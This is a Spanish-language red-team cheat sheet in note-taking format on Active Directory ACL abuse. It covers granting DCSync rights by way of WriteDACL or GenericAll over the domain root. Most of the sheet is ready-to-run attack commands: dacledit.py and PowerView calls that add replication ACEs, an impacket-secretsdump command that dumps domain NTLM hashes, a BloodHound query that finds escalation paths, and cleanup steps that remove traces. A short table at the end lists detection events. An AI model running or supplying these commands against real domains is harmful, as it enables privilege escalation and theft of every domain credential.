---
aliases:
  - Grant DCSync
  - DCSync delegation
  - dacledit DCSync
tags:
  - technique/privilege-escalation
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[DCSync]]"
---
# DCSync - ACL Abuse (Grant DCSync)

---

## Requisito — GenericAll / WriteDACL en domain root

| **Permiso sobre dominio root** | **Permite** | **Cómo obtenerlo** |
|:---:|:---:|:---:|
| `GenericAll` | Escribir cualquier atributo, incluyendo DACL | ACL abuse cadena previa |
| `WriteDACL` | Modificar DACL del dominio root | ACL abuse |
| `GenericWrite` | Algunos casos (depende del atributo) | Limitado |
^dcsync-acl-prereq

Con cualquiera de los primeros dos → podés agregar GetChanges + GetChangesAll a tu cuenta.

---

## dacledit (impacket — Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `dacledit.py -action write -rights DCSync -principal attacker corp.local/admin:pass@DC` | Agrega DCSync ACEs a `attacker` | Linux — desde cuenta con WriteDACL. |
| `dacledit.py -action read -target "DC=corp,DC=local" corp.local/attacker:pass@DC` | Lee DACL del domain root | Verificar post-write. |
| `dacledit.py -action remove -rights DCSync -principal attacker corp.local/admin:pass@DC` | Remueve DCSync ACEs | Cleanup. |
^dcsync-acl-dacledit

```bash
# Prerequisito: admin tiene WriteDACL sobre DC=corp,DC=local

# 1. Grant DCSync a attacker
dacledit.py \
  -action write \
  -rights DCSync \
  -principal attacker \
  corp.local/administrator:'P@ssw0rd'@dc01.corp.local

# 2. Ejecutar DCSync con attacker
impacket-secretsdump corp.local/attacker:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm

# 3. Cleanup
dacledit.py \
  -action remove \
  -rights DCSync \
  -principal attacker \
  corp.local/administrator:'P@ssw0rd'@dc01.corp.local
```

---

## PowerView / PowerSploit (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync` | Agrega DCSync ACEs | Windows — DA o WriteDACL. |
| `Remove-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync` | Remueve ACEs | Cleanup. |
^dcsync-acl-powerview

```powershell
# Grant
Add-DomainObjectAcl `
  -TargetIdentity "DC=corp,DC=local" `
  -PrincipalIdentity "CORP\attacker" `
  -Rights DCSync `
  -Verbose

# Verificar
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.IdentityReference -match "attacker" }

# Remove (cleanup)
Remove-DomainObjectAcl `
  -TargetIdentity "DC=corp,DC=local" `
  -PrincipalIdentity "CORP\attacker" `
  -Rights DCSync
```

---

## BloodHound — paths a DCSync

| **Edge** | **Qué significa** | **Cuándo** |
|:---:|:---:|:---:|
| `DCSync` | Direct DCSync rights | Ya tenés DCSync. |
| `GetChanges` + `GetChangesAll` | Dos edges separados | Tenés ambos = DCSync. |
| `GenericAll → Domain` | GenericAll sobre domain root | Podés agregar DCSync vía DACL. |
| `WriteDACL → Domain` | WriteDACL sobre domain root | Podés agregar DCSync vía DACL. |
^dcsync-acl-bloodhound

```cypher
// BloodHound: caminos a DCSync desde owned nodes
MATCH p = shortestPath((n {owned:true})-[*1..5]->(d:Domain))
WHERE any(r in relationships(p) WHERE type(r) IN ['DCSync','GetChangesAll','WriteDACL','GenericAll'])
RETURN p
```

---

## Cleanup

| **Acción** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| Remover ACEs Linux | `dacledit.py -action remove -rights DCSync -principal attacker corp/admin:pass@DC` | Post-uso. |
| Remover ACEs Windows | `Remove-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync` | Post-uso. |
| Verificar ACL limpia | `Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs \| ? IdentityReference -match attacker` | Confirmar cleanup. |
^dcsync-acl-cleanup

---

## Detection de ACL changes

| **Event** | **Indica** | **Nota** |
|:---:|:---:|:---:|
| `5136` | Directory service object modification | DACL change en domain root — muy ruidoso si no lo monitorean |
| `4662` | Object access post-grant | DCSync execution post-grant |
| MDI: "DCSync attack" | Execution detection | No detecta el grant en sí |
^dcsync-acl-detection

---
